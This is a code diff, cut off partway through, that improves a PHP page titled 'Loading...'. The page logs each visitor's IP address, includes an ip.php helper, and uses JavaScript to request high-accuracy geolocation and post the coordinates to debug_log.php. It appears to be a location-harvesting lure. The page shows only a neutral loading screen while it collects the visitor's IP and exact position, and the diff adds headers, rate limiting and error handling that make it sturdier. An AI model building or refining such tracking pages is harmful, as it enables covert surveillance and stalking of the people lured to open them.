@@ -1,41 +1,86 @@
 <?php
-include 'ip.php';
+// Start session and set security headers
+session_start();
+header('X-Content-Type-Options: nosniff');
+header('X-Frame-Options: DENY');
+header('X-XSS-Protection: 1; mode=block');
+header('Referrer-Policy: no-referrer');
+header('Content-Security-Policy: default-src \'self\'; script-src \'self\' https://www.google.com https://www.gstatic.com; style-src \'self\' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src \'self\' data: https:; media-src \'self\'; connect-src \'self\';');
 
-// Add JavaScript to capture location
+// Include IP handling with validation
+if (file_exists('ip.php')) {
+    include 'ip.php';
+}
+
+// Log access
+$log_message = date('Y-m-d H:i:s') . " - " . $_SERVER['REMOTE_ADDR'] . " accessed " . $_SERVER['PHP_SELF'] . "\n";
+file_put_contents('access.log', $log_message, FILE_APPEND);
+
+// Add JavaScript to capture location with improved error handling and security
 echo '
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-Content-Security-Policy" content="default-src 'self' https:; script-src 'self' 'unsafe-inline' https://www.google.com https://www.gstatic.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; media-src 'self'; connect-src 'self';">
     <title>Loading...</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
-        // Debug function to log messages - only log essential information
-        function debugLog(message) {
-            // Only log essential location data, not status messages
-            if (message.includes("Lat:") || message.includes("Latitude:") || message.includes("Position obtained successfully")) {
-                console.log("DEBUG: " + message);
-                
-                // Send only essential logs to server
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", "debug_log.php", true);
-                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                xhr.send("message=" + encodeURIComponent(message));
-            }
-        }
-        
-        function getLocation() {
-            // Don\'t log this message
+        /**
+         * Enhanced debug logging with rate limiting
+         */
+        const debugLog = (() => {
+            const MAX_LOGS_PER_MINUTE = 10;
+            let logCount = 0;
+            let lastReset = Date.now();
             
-            if (navigator.geolocation) {
-                // Don\'t log this message
+            return function(message) {
+                // Reset counter if a minute has passed
+                if (Date.now() - lastReset > 60000) {
+                    logCount = 0;
+                    lastReset = Date.now();
+                }
                 
-                // Show permission request message
-                document.getElementById("locationStatus").innerText = "Requesting location permission...";
-                
-                navigator.geolocation.getCurrentPosition(
-                    sendPosition, 
-                    handleError, 
-                    {
+                // Only log essential location data and respect rate limit
+                if ((message.includes("Lat:") || message.includes("Latitude:") || 
+                     message.includes("Position obtained successfully")) && 
+                    logCount < MAX_LOGS_PER_MINUTE) {
+                    
+                    console.log("DEBUG: " + message);
+                    logCount++;
+                    
+                    // Send to server with error handling
+                    try {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open("POST", "debug_log.php", true);
+                        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                        xhr.timeout = 5000; // 5 second timeout
+                        xhr.onerror = () => console.error("Failed to send debug log");
+                        xhr.ontimeout = () => console.error("Debug log request timed out");
+                        xhr.send("message=" + encodeURIComponent(message));
+                    } catch (e) {
+                        console.error("Error in debugLog:", e);
+                    }
+                }
+            };
+        })();
+        
+        /**
+         * Get geolocation with improved error handling and user feedback
+         */
+        function getLocation() {
+            const statusElement = document.getElementById("locationStatus");
+            if (!statusElement) return;
+            
+            if (!navigator.geolocation) {
+                statusElement.innerText = "Geolocation is not supported by your browser";
+                return;
+            }
+
+            // Show permission request message
+            statusElement.innerText = "Requesting location permission...";
+            
+            const options = {
                         enableHighAccuracy: true,
                         timeout: 15000,
                         maximumAge: 0
